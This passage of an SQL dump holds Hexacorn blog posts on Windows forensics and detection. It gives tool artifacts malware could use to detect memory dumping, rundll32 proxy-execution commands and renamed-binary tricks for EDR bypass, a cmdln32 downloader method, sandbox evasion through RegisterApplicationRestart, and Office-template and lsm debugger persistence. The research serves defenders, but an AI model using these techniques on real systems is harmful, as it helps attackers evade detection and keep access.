FastDump\n\n32-bit\n\nfastdumpx86\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\fastdumpx86\n\n\n64-bit\n\nfastdumpx64\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\fastdumpx64\n\n\n\n\nEncase\n\n32-bit\n\nwinen_\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\winen_\n\n\n64-bit\n\nwinen64_\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\winen64_\n\n\n\n\nFTK Imager // 32- and 64-bit\n\nMemory\n\nAccessData Driver\n%TEMP%\\ad_driver.sys\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\ad_driver\n\n\nFilesystem driver\n\nFRIdrv\n%SYSTEM%\\Drivers\\FRIdrv.sys\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\FRIdrv\n\n\n\n\nRekall’s pmem\n\npmem\n%TEMP%\\pme*.tmp\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\pmem\n\n\nMemoryze\n\nMandiant_Tools\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\Mandiant_Tools\n\n\nRedline\n\nFeKern\n%SYSTEM%\\Drivers\\FeKern.sys\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\FeKern\nC:\\Program Files\\Redline\\\n\n\n(OLD!!!) MDD\n\nManTech MemDd Device Driver\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\mdd\n\n\n(OLD!!!) Physmem\n\nHKCU\\Software\\Sysinternals\\Physmem\n\n\n\n\n\nAdditionally, one could try to open (using CreateFile) the devices created by these services, or simply look for process names associated with these tools. The memory dumping process takes a while and if malware checks every second or so, it is enough to detect the acquisition in progress…\nI guess it’s obvious now that using fixed / hard-coded names in these tools is not a good idea. For this very reason old rootkit detection tools like RKU and GMER use randomized device names for nearly 10 years or so.\nLast, but not least – this post is not to bash the memory forensics. It’s one of the most important tools we have in our arsenal. However, it’s important to know that it’s just one of the tools and under some circumstances we may simply need to use different approach.\nSome references – far more advanced ideas and techniques:\n\nhttps://www.slideshare.net/lmilkovic/defeating-windows-memory-forensics\nhttps://media.blackhat.com/bh-eu-12/Haruyama/bh-eu-12-Haruyama-Memory_Forensic-Slides.pdf [PDF warning]\nhttps://www.blackhat.com/presentations/bh-jp-05/bh-jp-05-sparks-butler.pdf [PDF warning]\nhttps://events.ccc.de/congress/2012/Fahrplan/attachments/2231_Defeating%20Windows%20memory%20forensics.ppt [PPT warning]\n\nIf you know other artifacts related to memory acquisition tools, or have other anti-memory forensics ideas please let me know, thanks!\nShare this :)', 'Anti-*, Anti-Forensics, Forensic Analysis', 'http://www.hexacorn.com/blog/2017/07/10/if-memory-doesnt-serve-me-right/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (96, 'Permanent Link to Welcome back, EDR!', 'Hexacorn', 'June 17, 2017 ', 'Update\nAdded one more bullet point – AV vs EDR – testing on live systems\nOld post\nI heavily criticized EDR in my last post (and in fairness, I did a few times before – both threat hunting, and EDR), so I thought I will list some ideas I have with regards to assessing this tool in a more pragmatic way. Whining is good, as long as it produces some solutions… I could call that previous post a classical sh1tpost and it kinda fits as it served the purpose. It did stir some controversy and if you reflected on EDR in general or got emotional about my ramblings in any way,  thank you.\nI think the first question we need to answer is the expectations we have towards the EDR tools. That’s because mine were too high.\nIn my view, the EDR should fill-in the gap between the AV and the DFIR process, for both detection and remediation. The gap for detection is to cover the malicious activity that AV and other controls can’t detect. In my opinion the core value of the detective capability of EDR is supposed to be ‘seeing more’ than AV, and logging it + passing it to the external storage (for backup, and analysis).\nThe remediation gap is focusing on the access to the system to contain the malicious activity remotely without a need to engage local helpdesks, security officers, and taking computers away from the users. I have done a lot of it using psexec, or onsite and it’s fun for a while, but getting old pretty soon.\nAnd if apart from detection and remediation the EDR offers some prevention capabilities (f.ex. blocking applications from running like f.ex. Bit9), it’s even better.\nThe functionality of EDR that is scattered among products varies and a while ago I made an attempt to classify and describe these features in the EDR sheet based on the astonishingly good feedback from the community. I think this sort of cooperation works for the benefit of us all – the defenders. Red teams have it relatively easy, for us it’s a hamster wheel, whack-a-mole and omni-present impostor syndrome that comes as a result of NOT knowing it all… \nI think my main criticism of EDR comes directly from the experience of having to comb a huge number of events. As someone told me – the EDR and threat hunting suffers from the big data problem. Solving it in a typical, signature-based way is wrong. I tried, and I feel that I failed. I know other succeeded. Some readers shared a good experience with EDR and they are pretty comfy using it on daily basis. What is interesting though, for these that indicate it works for them – it’s often smaller shops. Perhaps they have more influence, perhaps they can customize things betters and don’t have to deal with the political, technical, legal and historical issues deeply embedded inside the large companies… Who knows… I am actually a big fan of customized tools and it’s great to see people use the principles of DFIR to cover the company with the solid threat detection umbrella. Interestingly, they often rely on free tools 100%.\nWith regards to data combing. This activity raises a interesting question – is the burden of tuning of the EDR on vendor, or the users?\nThis is not a trivial question. There could be easily hundreds queries that you can incorporate into the EDR, and every day there is a new discovery, bypass, or trick that you need to add to your arsenal. Some may be VERY specific to your environment. F.ex. you could do some nice hunting for processes spawn by server programs, files dropped in the product-specific folders (file integrity ‘light’) and significantly improve the ability to detect important anomalies by defining exclusions based on the setup of some services, your baselines, simple rules that rely on host naming conventions, or even internals source IPs used by the vulnerability scanners and approved pentesters. Still, the larger the environment, the larger the volume of events.\nSo, the answer is probably this: both. With so much research going on, I’d like EDR to constantly update the ruleset to offer ‘the out of the box’ experience.\nAs for the external threat hunting ideas – it’s actually tough to keep up. Just look at Twitter. There is a never ending stream of new, or well-documented ideas. They are constantly re-visited and improved. Still, this is sort of feasible and eventually you will end up with a decent set of pretty robust event generators.  And this is what they are – the event generators. And lo, and behold – these logs require incident spotters. And these can’t be L1 guys. You need a trained eye of someone who actually did breach analysis in the past. You need DFIR professionals. That’s probably a good business case to bring more very well trained people on board. You should have at least one person like this to train others, and assess more difficult cases. We are not talking about IOC collectors. We are talking about people who look at all pieces of the puzzle distributed amongst various systems.\nSince I mentioned bridging the gap between AV and DFIR I want to dig deeper into it. In a typical DFIR process (the more modern one) you would like to explore memory artifacts, list of processes, handles, network connections, etc. and if possible, browse through the historical events that led to certain things happening on the system. I think the EDR that provides this functionality is a fantastic discovery tool as it perfectly supports the triage process – the triage process that until few years ago had to be either done manually, or with a help of heavy-duty tools, and sometimes even visit on site. So, giving the ability to retrieve the artifacts remotely in real-time is a great feature. As usual, there are various ways to deliver this functionality. Snapshots, dynamically refreshed list of ‘current’ view of the system, full trace of system events for a while, with the memory and network snapshots included.\nWith regards to alerting, watchlists, triggers, detectors, or whatever else they are called – this is the area that probably frustrates me the most. I claimed and I maintain the opinion that threat hunting is still focused mainly on writing signatures (even if they are based on correlations, they are still a simple logical statements). They do not differ from IDS, AV, and yara. They may be focused on a narrower and more subtle subset of values, but it’s still what it is. Implementing every single rule gives you two choices – strict, very specific, or wide, to cover all angles. The first one may not trigger often and is kinda perfect (f.ex. using unusual persistent key is a very good activity to monitor) – here comes the kowtow to SwiftOnSecurity and his/her sysmon config. The wider rules need eyeballing, or some sort of data reduction.Again, this needs a pair of trained eyes.\nWith regards to feeds. Various people and companies approach it in a different way and in my experience, and kinda ironically, the best results come from the … VT feeds. Maybe this is the reason why so many AV companies got pissed off that their work is leveraged by the ‘Next Gen’ solutions and threatened to pull out of VT a while ago. If we exclude VT, we have to do something different. Data stacking comes to help, various blacklists and IOCs too. Then comes machine learning and some more fancy AI. At least these are the claims. I honestly don’t know how many of these internals work as real ML/AI, and what artifacts or artifact properties they focus on. I have been in this industry for long enough and clustered enough samples by both static and dynamic analysis to know that it’s non-trivial. Very non-trivial. If you look at the old Upatre, it implements a perfect windows message loop and the malicious activity happens in a window procedure. How would you detect that it behaves in a different way than a normal say notepad++ editor, or process hacker (both GUI, both connect out). You could do some analysis of GUI elements, and perhaps check if the user even saw the window (was it even visible, or was there any mouse activity within its client area, any keys inputted, etc.), but this is where we enter the area of behavior analysis (and new line of products that are UBA/UEBA). Something that AV does for a long time… And it still doesn’t produce such great results. Many products use dirty tricks (AV included) f.ex. installers that inject code to explorer.exe to self-delete (for legitimate purposes). These are your FPs. I have seen many.\nWhat is the game changer then?\nOn a high-level, EDR logs are like Windows Event logs. They are more granular, but they lack the context. Perhaps there is a need to ‘tag’ events that are result of user activity, or via admin scripts. Maybe there is a need to tag installation of plugins, software, even downloads of software. So that a better timeline can be built. Not one that shows things happened, but HOW they happened and are correlated. Was the file executed via explorer.exe by the user? or it’s a code injected by malware or hooking DLL? Or the instrumented GUI used by the UI testing software? Again, it’s not trivial. Perhaps the whole thing will disappear when Windows moves to Apple-like ecosystem. There are more and more signs of it…\nI won’t cover remediation. It’s a big topic and we don’t even need to bother talking about it until we have solid detection in place…\nSo… how can we assess if EDR delivers?\nI think we can analyze various parameters. None of them related to core functionality presented in the EDR sheet. It’s more or less the sort of data you pull from various security controls on regular basis. So, not a rocket science here.\n\nAV vs EDR – this is easy; install Av, install EDR, run a number of representative samples and see what happens; compare\n\nI would not recommend it\nRemember, EDR is a complementary control and NOT a replacement for AV; we are not there yet\nIt doesn’t really answer any questions; one more time: the equation is that AV+EDR>AV\nAs such, I would never suggest anyone to uninstall AV even if EDR detected 99% more samples. Again, we are not there yet.\n\n\nAV vs EDR – testing on live systems\n\nThis is a possibly best way to see if EDR vendors claims are justified\nProvided that you have both AV and EDR on all the systems, start looking at all these alerts from AV – for every single alert see if you get any hits from EDR; this is not only to scrutinize the EDR vendor (or AV, for that matter), but also to come up with new ideas for threat hunting\nAnd in case you are wondering… there is a huge area of malicious cases that EDR will most likely never see, or will find it non-trivial to detect:\n\nstatic, never executed in a ‘normal’ way files, but still malicious f.ex. whatever you can find on removable drives\nsame as above, bit on the server-side – f.ex. web shells\noverwritten / patched files\nmalware inside ‘dead’ folders f.ex. WINDOWS.OLD\nmalware inside backups\nmalware inside containers (f.ex. OLE files, .msg files, rar, cab, arj, etc.)\ncomputer viruses\n\n\n\n\nEDR Performance hit\n\nCPU usage\nMemory usage (idle and working)\nSize of the agent (in memory)\nNumber of process spawn (this end sup in logs + contaminates the evidence!)\nNumber of network connection and frequency\nTraffic volumes (see below for ‘EDR Privacy and telemetry’)\n\n\nEDR Event generation\n\nHow many devices covered?\nIs it possible to tell if agent is installed/up and running\nHow many queries/detectors ‘out of the box’\nHow many events generated? Total? Per system / average /?\nHow many of them got promoted to incidents\nDo you see all events needed? /this requires a separate post/\nHow many of these incidents were detected by EDR itself? By the external feed? By internal logic/ML/AI?\nHow many human resources required to eyeball the logs?\n\n\nEDR Vulnerabilities\n\nAre there any? How fast they are fixed?\nIMHO these are completely uncharted waters with some minor research out there; additional attack surface + often new products written in a hurry ==> potentials for lots of vulns\n\n\nEDR Support\n\nI think this is big part of the assessment\nDo you have a direct access to actual engineers, or just inhuman ticketing system? They can often answer the most difficult questions quickly and hey… they speak the same language w/o marketing buzz\nDo they actually reply to your queries with a sincerity? You can quickly tell\nAre they a new startup (and you are a guinea pig for their software); not necessarily bad, but may bring issues\n\n\nEDR Privacy and telemetry\n\nWhat sort of data does it sends to ‘the cloud’?\nDoes it support Data Across Borders and other global/local regulations?\nAre they using artifacts from your system to build their own repo of artifacts? Not necessarily a bad thing, but the cost is possible data leakage, legal issues and extensive traffic (we are talking large volumes for some EDR)\n\n\nEDR Company’s future\n\nThis is the last bullet point for a reason – we are already in a middle of large transition to commoditize security (like any other services before)\nMost of the companies want to and will be acquired\nIf there are any signs of possible acquisition, perhaps better to wait a bit to let the dust settle before engaging them\nThis is because acquisition has both pros and cons. Pros: the service won’t disappear overnight; Cons: it will get worse, most of the time and many ‘good’ guys will move to work elsewhere; this is the state of the affairs in security companies\n\n\n\nThat’s it. If you have any comments, or feedback please let me know. I was wrong many times before, and writing this stuff down it helps me to revisit my bias and ideas. I want EDR to work for me on the same level like AV. At least.\nShare this :)', 'EDR', 'http://www.hexacorn.com/blog/2017/06/17/welcome-back-edr/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (97, 'Permanent Link to Bye Bye EDR…', 'Hexacorn', 'June 13, 2017 ', 'Update\nIf you had read the below post and it made you blood boil, mission accomplished  Just kidding. The idea of the post was and still is this – to raise the question: what is the value of EDR and how to measure it? I am assuming the value is there, but it’s lower than expected. I was myself quite shocked when I had to come to terms with this observation.\nAnd just in case – this was a vendor-independent statement. I woke up one morning, and realized that I have expectations towards EDR and we are pretty far today from these expectations to be met.\nSo, while shots were fired, the question remains: how do we assess the value of EDR?\nFor comparison: AV is looked at in a very harsh way. The expectation is to cover 100/100.\nCan we apply the same assessment criteria to EDR?\nI’d love to see high-fidelity alerts only from EDR. But I know it’s impossible.\nWhat’s the acceptable ratio then? 30%?\nThis is a valid question, because in a large organization you need resources to eyeball all these mail alerts and  dashboards. And expectations should be set for the analysts who process this data.\nAnd if the ratio of the TP is low, you end up looking at events most of the day, and all day long and hey… isn’t the whole idea of tools like EDR to recognize the incidents in the flood of events… ?\nOld post\nI officially lost faith in EDR.\nI know that for some it works. It does work for me too. Sometimes. But… more often that that – it doesn’t.\nI am done with the EDR.\nIts alerting is following the paths of firewall, IDS, DLP, windows event logs, and… yara rules. Lots of alerts, poor ROI.\nArrivederci EDR.\nAV beats EDR in so many aspects. It’s high fidelity. It’s precise. Its heuritics feeds are often better. It also offers remediation and it is undo-able. It even prevents bad stuff from running.\nEDR is kaputt.\nIt assigns value to so-much-hated signatures. The form has changed, but the result is the same. You only see what you can write a rule for. And then you see it, and it’s surrounded by so many FPs. You probably suck at writing rules. Except many are not written by you and come from the other threat hunting experts.\nEDR is a waste of money, and time. Now, there you have it – I’ve said it.\nEDR was a nice utopia. I believed it for a while. In a perfect world you can gather all these logs and gather intel about activities on the system, of the user, network events, and then profile various scenarios and look at the dashboard happily cherry-picking the bad guys. A nice placebo in the absence of better solutions, despite them being available for a long time (f.ex. whitelisting).\nBut in reality you face the alarm fatigue, and suffer from infobesity.\nEDR stands for Endpoint Detection and Response. It’s neither Detect nor Response. But in my books, it’s defo at the end point.\nShare this :)', 'EDR', 'http://www.hexacorn.com/blog/2017/06/13/bye-bye-edr/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (98, 'Permanent Link to Using RegisterApplicationRestart as a (lame) sandbox evasion', 'Hexacorn', 'May 20, 2017 ', 'The RegisterApplicationRestart function allows the OS to relaunch the application in case it crashes, or fails for other reasons (or when an installer needs to restart the system and then launch again).\nTo avoid cyclical restarts the program needs to run for at least 60 seconds though.\nSo, imagine a program that does the following:\n\nCheck if a specific command line argument is provided\n\nIf yes\n\nRun malware\n\n\nIf no\n\nRegister itself via RegisterApplicationRestart and provide a command line f.ex. /nosandbox\nSleep for 60 seconds using Sleep\nCause a crash (f.ex. divide by 0)\n\n\n\n\n\nIf the application is ran w/o a sandbox, it will be relaunched by the OS after the crash and with a /nosandbox argument – it will execute the malware.\n\nIf the application is ran under sandbox, the sandbox engine will most likely affect the running of the Sleep function. This in turn will disable the functionality of the RegisterApplicationRestart function. The program will run less than 60 seconds, hence won’t be restarted after the crash. The sandbox report will be pretty much empty.\nNote, with its default settings, Windows 10 will simply restart the application:\n\nFor earlier versions, the user may be asked to choose whether they want to restart the application (depending on Windows Error Reporting settings). Notably, if such dialog  popped up while the sample was running inside the sandbox, there is a chance the sandbox would autoclick the ‘restart’ option for us. But then… well.. it would have to wait these 60 seconds first, wouldn’t it?\nBonus forensic information:\nThe less used option of RegisterApplicationRestart API is in conjunction with installers. If combined with ExitWindowsEx,EWX_RESTARTAPPS,… it will register the app to be executed by the systems with the next logon. The mechanism of this temporary persistence mechanism is quite interesting.\nRight before the user is logged off the csrss.exe process registers a RunOnce entry located in the following location:\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\Application Restart #<NUMBER>\n\n– it is simply pointing to the restarted application.\nSo, if you ever see entries like these:\n\nHKCU\\Software\\Microsoft\\Windows\\\nCurrentVersion\\RunOnce\\Application Restart #0\nHKCU\\Software\\Microsoft\\Windows\\\nCurrentVersion\\RunOnce\\Application Restart #1\n\netc.\n– then it’s most likely a result of an unfinished installer business…\nCould it become a persistence mechanism and become a part of the Beyond Good Ol’ Run key series? Perhaps, but I have not found a practical way to do it w/o restarting the system (perhaps aborting the restart could help, but from what I can tell the csrss.exe registers the RunOnce persistence mechanism pretty late).\nShare this :)', 'Anti-Forensics, Forensic Analysis, Sandboxing', 'http://www.hexacorn.com/blog/2017/05/20/using-registerapplicationrestart-as-a-lame-sandbox-evasion/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (99, 'Permanent Link to The cyberpoppers, the security fix, and … the Other guys', 'Hexacorn', 'May 10, 2017 ', 'Cyberpopping is a term I coined for the lack of a better word to describe any vague and most of the time responsibility-free activity that is either used and/or abused to sell and market IT security in whatever form and shape possible. Yup, the activity where the seller is not being necessarily responsible for overseeing that security to the remediation/closure/assurance phase.\nWe all practice it.\nThere are various cyberpoppers out there:\n\n0days\nAPT\nDumps\nSecurity Certificates\nSecurity Conferences\nSocial media, including Twitter and blogs (including yours truly)\nPeriodical reports from vendors and Gartner\nCompliance requirements (PCI DSS, ISO)\nGroups, forums\netc.\n\nAt every step of this journey the ego and schadenfreude prevails. We all know better. And anytime we find something new and cool, the Champagne cork pops and we get the fix. I love it, you love it. We are one big family of security enfants terrible \nAs I get older though and get more and more insight into the less flashy part of the security world – one where the security is actually being implemented – it becomes more and more apparent to me that none of these things really help the Other guys. If you watched the movie you know who I am talking about. These poor creatures that sit in the backend offices, spend hours on the calls, actually talk to business people and clients, speak to non-technical people, and ensure the stuff that we are all breaking, or talk about breaking – is actually fixed. This is not a fun job, it’s error-prone, it ricochets when they screw up (it often costs big bucks!), it is long hours, and on-calls where the big decisions are made. I just want to take the moment today to say thank you to all engineers, admins, firewall guys, architects, customer-facing security guys, vulnerability management teams, and ISOs and any other guys who actually deal with the _real_ world aspects of IT security.\nCopyright note: the pic adapted from the one posted on wikipedia\nShare this :)', 'Preaching', 'http://www.hexacorn.com/blog/2017/05/10/the-cyberpoppers-the-security-fix-and-the-other-guys/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (100, 'Permanent Link to Running programs via Proxy & jumping on a EDR-bypass trampoline', 'Hexacorn', 'May 1, 2017 ', 'The parent-child process relationship is very helpful when it comes to defining detection rules and watchlists. For instance, anytime a winword.exe spawns a cmd.exe, powershell.exe, cscript.exe, wscript.exe, mshta.exe it is an obvious anomaly that may be a sign of an Office macro-based infection.\nHowever, insert an unexpected process in-between and the rule/watchlist fails. Perhaps for this reason, it would be nice to have EDR rulesets that can refer not only to parents, but also to ancestors of the process.\nSince this relationship is prone to manipulation let’s  have a look at a couple of possible examples:\n\n\nrundll32 url.dll, OpenURL file://c:\\windows\\system32\\calc.exe\n\n\nrundll32 url.dll, OpenURLA file://c:\\windows\\system32\\calc.exe\n\n\nrundll32 url.dll, FileProtocolHandler calc.exe\n\n\nrundll32 zipfldr.dll, RouteTheCall calc.exe\n\n\nRunning any of these commands will launch calc.exe with the rundll32.exe as a parent.\nObviously, rundll32.exe is an obvious  bad guy too. What about we copy it first?\ncopy c:\\windows\\system32\\rundll32.exe %appdata%\\Adobe\\adobe.exe\nNow, we can launch:\n\n\n%appdata%\\adobe\\adobe.exe url.dll, OpenURL file://c:\\windows\\system32\\calc.exe\n\n\n%appdata%\\adobe\\adobe.exe url.dll, OpenURLA file://c:\\windows\\system32\\calc.exe\n\n\n%appdata%\\adobe\\adobe.exe url.dll, FileProtocolHandler calc.exe\n\n\n%appdata%\\adobe\\adobe.exe zipfldr.dll, RouteTheCall calc.exe\n\n\nAnd get the very same result, this time, with the parent process being adobe.exe.\nIf you know any other EXE/DLL combo that can act as a proxy, I’d be grateful if you could let me know. Thanks!\nShare this :)', 'Anti-*, EDR, Incident Response, LOLBins', 'http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (101, 'Permanent Link to The Archaeologologogology #3 – Downloading stuff with cmdln32', 'Hexacorn', 'April 30, 2017 ', 'One of the less-known tools residing in Windows system32 directory is cmdln32.exe. It is being used by CMAK (Connection Manager Administration Kit) to set up Connection Manager service profiles. The profile is typically packaged into an .exe that can be deployed to the user system. The package installs the profile that can be used to launch a Dial-up/VPN connection.\nOn older versions of Windows f.ex. XP you could fool cmdln32.exe to act as a simple downloader.\nYou can create 3 files:\n\nA profile file\n[Profile Format]\r\n\r\nVersion=4\r\n\r\n[Connection Manager]\r\n\r\nCMSFile=<settings file name - described next>\n\nA settings file\n[Connection Manager]\r\n\r\nTunnelFile=<tunnel file name - described next>\n\nA tunnel file\n[Settings]\r\n\r\nUpdateUrl=URL pointing to the file\n\n\nThe file that UpdateUrl points to needs to start with a [VPN Servers] Profile Section, followed by the actual data  f.ex.:\n[VPN Servers]\r\nThis could be anything...\nAll you have to do now is to launch cmdl32.exe passing to it a full path to the profile file and providing a VPN argument f.ex.:\ncmdln32 c:\\test\\profile /vpn\nThe program will read the profile file, then read the file name of the settings file; then read the settings file and extract the file name of the VPN tunnel file, and finally from the VPN file it will retrieve the URL for the update. Once downloaded, the file that the UpdateUrl location point to will replace the tunnel file (overwrite).\nIf it sounds complicated, it definitely is :), but it works and such download could potentially fly under radar of security products.\nThe request sent by the tool looks as follows:\nGET / HTTP/1.1\r\nUser-Agent: Microsoft(R) Connection Manager Vpn File Update\r\nHost: <domain>\nSo it’s easy to look for it in the logs. The version of the tool that is used on newer versions of Windows is a bit more careful. It checks if the RAS connection provided in the settings file is present (note, in my example the RAS connection is not listed inside the settings file) and only if it does, the tool continues. The alternative to the VPN download is the PhoneBook download, but this also requires the presence of the RAS connection. You can read about Connection Manager Tools and Settings on the Microsoft web page from 2003.\nIf you have a spare XP box you can test this functionality by downloading this package, placing its content inside c:\\test and launching the cmdl32.exe via the following command:\ncmdln32 c:\\test\\cmdl32_xp.cmp /vpn\nWill this still work on newer versions?\nI don’t know, but here are two ideas:\n\nAs long as _some_ program can be smuggled in to the victim’s system (f.ex. from the malicious attachment) it could launch cmdln32.exe under control of custom debugger and patch the RAS Enumeration check during run-time\nPerhaps it’s possible to find a configuration where the RAS Enumeration check will work and knowing the RAS connection’s name one could set up a profile that would allow the download\n\nIn terms of forensics, you may find the following file inside the %TEMP% folder (XP-only):\n\n\n%Temp%\\VPN<random>.tmp\n\n\nIn any case, it’s just a trivia – it cannot really become a replacement for BITS…\nShare this :)', 'Archaeology, Living off the land, Reversing', 'http://www.hexacorn.com/blog/2017/04/30/the-archaeologologogology-3-downloading-stuff-with-cmdln32/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (102, 'Permanent Link to Beyond good ol’ Run key, Part 62', 'Hexacorn', 'April 19, 2017 ', 'Update\nThis is not an RCE. If it was, I would not publish it on this blog \nTurns out “Simpsons already did it” and as pointed out by @arekfurt a normal template-based persistence is already implemented in EmpireProject and is based on awesome work of @enigma0x3. Interestingly, enabling macros is not needed to deliver the same functionality (as explained below).\nDropping any macro sheet inside the XLSTART folder and opening it from there will not show the macro warning \nOld Post\nEvery once in a while we come across weird things that we not only discover accidentally, but are finding hard to understand. Today I was playing around with Word Macros and to my surprise I was able to accidentally run one, while my Macro Options were set to Disable all macros with notification.\nIntrigued, I quickly realized that instead of adding it to a test word document, I accidentally added it to the normal template file.\nCould it be… ?\nI rushed to add the AutoOpen macro to the normal template that will launch the Calculator anytime the template is used:\nNow I only needed to open some word document…\nHow nice!\nInterestingly, the Security Warning appears ONLY after I visit options while the document is open.\nSwap calculator with anything else, and a new stealth persistence mechanism is born…\nNow, what about Excel?\nExcel doesn’t have the Normal template equivalent by default, but you can add one. To do so, you just need to record any macro named Auto_Open and store it inside a personal template (by choosing ‘Store macro in Personal Macro Workbook‘):\n\n(alternatively, you can create a personal template directly on the system by placing a prepared XLSB file in a following location: c:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB)\nThen switch to the macro editor, and write the code as below:\n\nThis will ensure the Calculator will be executed anytime someone opens Excel, even if the macros are *cough* *cough* disabled…\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response,', 'http://www.hexacorn.com/blog/2017/04/19/beyond-good-ol-run-key-part-62/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (103, 'Permanent Link to IDA, hotpatched functions and signatures that don’t work…', 'Hexacorn', 'April 7, 2017 ', 'In my recent post, I described issues related to signatures of functions prefixed with 0xCC (int 3).\nIt turns out that there is one more issue that causes sigs to fail, including both the built-in ones and also these I build myself. I was recently seeing more and more files where sigs failed and eventually decided to investigate the reason.\nThe problem is caused by the hotpatch prefix for the functions. For 32-bit it is the instruction mov edi,edi (8B FF). If your signatures were built from standard libraries that were compiled with a hotpatch prefix, the sigs will include the prefix as well.\nWhat happens now when you see a piece of software that is using the very same version of the static library, but that uses the functions without the hotpatch? You end up with signature mismatch, and functions will not be recognized!\nLet’s look at the example:\n8BFF558BEC837D0800742D8B511483FA0872048B01EB028BC1394508721A83FA\n1E 2DB8 003E :0000 ?_Inside@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE_NPB_W@Z\nThis is a pattern generated from the libcpmt.lib included in SDK 10.0.\nNow, consider the code that looks like this:\nfun1:\r\n                push    ebp\r\n                mov     ebp, esp\r\n                cmp     DWORD PTR [ebp+8], 0\r\n                jz      short loc_10001297\r\n                mov     edx, [ecx+14h]\r\n                cmp     edx, 8\r\n                jb      short loc_10001276\r\n                mov     eax, [ecx]\r\n                jmp     short loc_10001278\r\nloc_10001276:\r\n                mov     eax, ecx\r\nloc_10001278:\r\n                cmp     [ebp+8], eax\r\n                jb      short loc_10001297\r\n                cmp     edx, 8\r\n                jb      short loc_10001286\r\n                mov     eax, [ecx]\r\n                jmp     short loc_10001288\r\nloc_10001286:\r\n                mov     eax, ecx\r\nloc_10001288:\r\n                mov     ecx, [ecx+10h]\r\n                lea     eax, [eax+ecx*2]\r\n                cmp     eax, [ebp+8]\r\n                jbe     short loc_10001297\r\n                mov     al, 1\r\n                jmp     short loc_10001299\r\nloc_10001297:\r\n                xor     al, al\r\nloc_10001299:\r\n                pop     ebp\r\n                retn    4\r\n\r\nfun2:\r\n                mov     edi,edi\r\n                push    ebp\r\n                mov     ebp, esp\r\n                cmp     DWORD PTR [ebp+8], 0\r\n                jz      short loc_2_10001297\r\n                mov     edx, [ecx+14h]\r\n                cmp     edx, 8\r\n                jb      short loc_2_10001276\r\n                mov     eax, [ecx]\r\n                jmp     short loc_2_10001278\r\nloc_2_10001276:\r\n                mov     eax, ecx\r\nloc_2_10001278:\r\n                cmp     [ebp+8], eax\r\n                jb      short loc_2_10001297\r\n                cmp     edx, 8\r\n                jb      short loc_2_10001286\r\n                mov     eax, [ecx]\r\n                jmp     short loc_2_10001288\r\nloc_2_10001286:\r\n                mov     eax, ecx\r\nloc_2_10001288:\r\n                mov     ecx, [ecx+10h]\r\n                lea     eax, [eax+ecx*2]\r\n                cmp     eax, [ebp+8]\r\n                jbe     short loc_2_10001297\r\n                mov     al, 1\r\n                jmp     short loc_2_10001299\r\nloc_2_10001297:\r\n                xor     al, al\r\nloc_2_10001299:\r\n                pop     ebp\r\n                retn    4\r\n\r\nStart:\r\n  call fun1\r\n  call fun2\r\n  invoke ExitProcess,0\nIf you now apply the signature built using the pattern above, you will get the following result:\nThe function with the hotpatch prefix (fun2) is recognized, and the one without (fun1) – is not!\nAfter discovering this bit I contacted the Hexrays guys and they fixed it with a simple, yet clever patch (Thx Igor&Ramiro). I can’t talk about the details, but I hope this will find its way into the new release of IDA.\nShare this :)', 'Malware Analysis, Reversing', 'http://www.hexacorn.com/blog/2017/04/07/ida-hotpatched-functions-and-signatures-that-dont-work/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (104, 'Permanent Link to Beyond good ol’ Run key, Part 61', 'Hexacorn', 'April 2, 2017 ', '3.5 years ago in the part 4 of the series we talked about various Registry keys related to debuggers.\nToday we will implement one.\nOne of the important system processes present in Windows since Vista is the Local Session Manager that runs from the file called lsm.exe. In Windows 10 the service was moved from a separate service process to lsm.dll that is loaded under svchost.exe. I don’t discuss Vista and Win8 details below, because who is using them anyway, but… it should work there too.\nThe lsm process has a little secret.\nWhen it starts it checks for a presence of the following entries:\n\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\n\nDebugTS=1 or 2 or 3\nLSMBreakOnStart=1 or 2 or 3 (Windows 10 only)\nDebugger = any string\n\n\n\nThe value of DebugTS (or LSMBreakOnStart) determines how LSM process will behave:\n\n1 – it will check if the user or kernel mode debugger is running, and if any of them is present it will just call DebugBreak to break into debugger session.\n2 – if the user mode debugger is not present, the LSM will actually launch it (guess what this post is all about…).\n3 – similar to 1.\n\nFor the option 2, the LSM will launch the NTSD debugger process using the following command line syntax:\n\nntsd -d -G -x -p <LSM pid>\n\nYup. The \\windows\\system32 path is not even specified, so the ntsd just needs to be placed in any location covered by the PATH environment variable.\nAnd in case you are wondering, the ntsd will be launched with the full SYSTEM privileges.\nWindows 7:\nWindow 10:\nIn order for things to work you need to implement ntsd.exe as a debugger to mimic the expected behavior. It has to take the PID from the command line, or retrieve the parent’s PID via NtQueryInformationProcess (or other means) and attach itself to LSM process. It then needs to create a debugging loop that will 